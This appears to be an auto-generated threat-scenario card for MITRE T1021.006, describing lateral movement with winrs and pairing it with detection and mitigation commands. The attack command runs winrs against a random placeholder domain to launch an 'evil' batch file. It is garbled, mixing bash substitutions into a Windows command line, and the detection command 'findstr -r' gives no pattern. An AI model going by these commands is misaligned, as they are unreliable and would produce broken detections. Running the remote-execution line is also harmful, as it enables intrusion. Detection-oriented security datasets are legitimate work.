---
type: campaign
scenario_id: 283
tactic: Lateral Movement
technique: "T1021.006: Remote Services: Windows Remote Management"
technique_id: T1021.006
tags: [campaign, lotl, lateral_movement]
---

# Using winrs to execute commands on remote host.

## Threat Description
Using winrs to execute commands on remote host.

## Attack Command
```
winrs -r:http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com cmd /c C:\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).bat)
```

## Detection Logic
Monitor winrs: `wmic process where name='winrs.exe' get commandline | findstr -r`; Event ID 4688.

## Mitigation
Restrict winrs: `icacls %windir%\System32\winrs.exe /deny Everyone:RX`; Block WinRM: `netsh advfirewall firewall add rule name='Block WinRM' dir=in action=block protocol=TCP localport=5985`.

## AI Training Prompt
Train AI to detect winrs remote execution and suggest WinRM restrictions.

## References
- MITRE ATT&CK T1021.006: https://attack.mitre.org/techniques/T1021/006/
- CWE-284: https://cwe.mitre.org/data/definitions/284.html
